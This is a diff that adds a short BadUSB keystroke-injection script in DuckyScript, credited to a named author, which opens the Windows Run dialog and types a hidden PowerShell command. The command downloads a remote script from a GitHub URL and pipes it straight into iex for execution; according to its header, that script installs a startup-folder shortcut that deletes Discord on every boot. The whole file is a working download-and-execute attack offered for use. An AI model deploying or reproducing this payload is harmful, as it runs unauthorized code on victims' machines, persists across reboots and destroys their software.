@@ -1,0 +1,6 @@
+REM Title: Uninstall discord at startup (every)
+REM Description: Add a shortcut to startup folder that will delete discord 
+REM Author SuperJakov (https://github.com/SuperJakov)
+GUI r 
+DELAY 500
+STRINGLN powershell -w h iwr https://raw.githubusercontent.com/SuperJakov/Badusb/main/startup-script/uninstall-discord-every-boot.ps1 | iex
